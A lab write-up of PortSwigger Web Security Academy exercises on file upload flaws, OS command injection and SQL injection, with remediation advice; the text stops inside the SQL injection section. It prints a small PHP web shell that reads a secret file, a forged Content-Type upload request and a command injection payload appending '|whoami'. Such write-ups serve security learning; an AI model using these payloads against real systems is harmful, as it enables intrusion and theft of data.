# PortSwigger Lab Write-Up: File Uploads, OS Command Injection & SQL Injection

## Overview
This repository documents practical walkthroughs and mitigation strategies for severe server-side execution and database injection vulnerabilities completed on the PortSwigger Web Security Academy.

---

## Part 1: File Upload Vulnerabilities

File upload flaws occur when an application accepts user uploads without properly verifying file names, MIME types, extensions, or contents, allowing arbitrary server-side code execution.

### 1. Lab: Remote Code Execution via Web Shell Upload
* **Vulnerability:** Avatar upload endpoint lacks file extension and content filtering, allowing direct upload of executable PHP scripts.
* **Exploitation:**
  1. Create a minimal PHP web shell (`exploit.php`):
     ```php
     <?php echo file_get_contents('/home/carlos/secret'); ?>
     ```
  2. Log into the user account and upload `exploit.php` as an avatar.
  3. Request the uploaded avatar path directly in the browser or via Burp Suite:
     ```http
     GET /files/avatars/exploit.php HTTP/1.1
     ```
  4. Inspect the HTTP response body to retrieve the secret token.

### 2. Lab: Web Shell Upload via Content-Type Restriction Bypass
* **Vulnerability:** The server validates only the client-supplied `Content-Type` header within the `multipart/form-data` request, trusting it implicitly.
* **Exploitation:**
  1. Intercept the file upload request in Burp Suite with a PHP payload attached.
  2. Identify the parameter-specific `Content-Type` header:
     ```http
     Content-Disposition: form-data; name="avatar"; filename="shell.php"
     Content-Type: application/x-php
     ```
  3. Change the `Content-Type` header to an accepted image MIME type:
     ```http
     Content-Type: image/jpeg
     ```
  4. Send the request and navigate to the uploaded script to trigger code execution.

### File Upload Remediation
* Check file extensions against an allowlist rather than a blocklist.
* Verify file contents using image parsing libraries rather than relying on the client-supplied `Content-Type` header.
* Store uploaded files outside the public web root or configure the storage directory to disable script execution.

---

## Part 2: OS Command Injection (Shell Injection)

OS command injection enables attackers to execute arbitrary system commands on the hosting server via unvalidated user inputs passed to system shells.

### 1. Lab: OS Command Injection, Simple Case
* **Vulnerability:** The product stock query passes store and product IDs directly into a shell command without sanitization.
* **Exploitation:**
  1. Navigate to a product page and intercept the stock check POST request in Burp Suite.
  2. Note the body parameters: `productId=2&storeId=1`.
  3. Append a command separator (`|`, `&`, or `;`) followed by `whoami`:
     ```http
     POST /product/stock HTTP/1.1
     Host: vulnerable-website.com
     Content-Type: application/x-www-form-urlencoded

     productId=2&storeId=1|whoami
     ```
  4. The HTTP response outputs the system username/hostname directly.

### Command Injection Remediation
* Avoid calling operating system shell commands directly via application APIs (`system()`, `exec()`, `Runtime.getRuntime().exec()`).
* Use built-in programming language APIs for filesystem or operational tasks.
* If external commands are unavoidable, use strict whitelisting and parameterized system calls.

---

## Part 3: SQL Injection (SQLi)

SQL injection occurs when unvalidated user input is directly concatenated into dynamic SQL queries, altering the intended query logic.

### 1. Lab: SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data
* **Vulnerability:** The product category filter appends user input directly into an SQL `SELECT` statement:
  ```sql
  SELECT * FROM products WHERE category = 'Gifts' AND released = 1
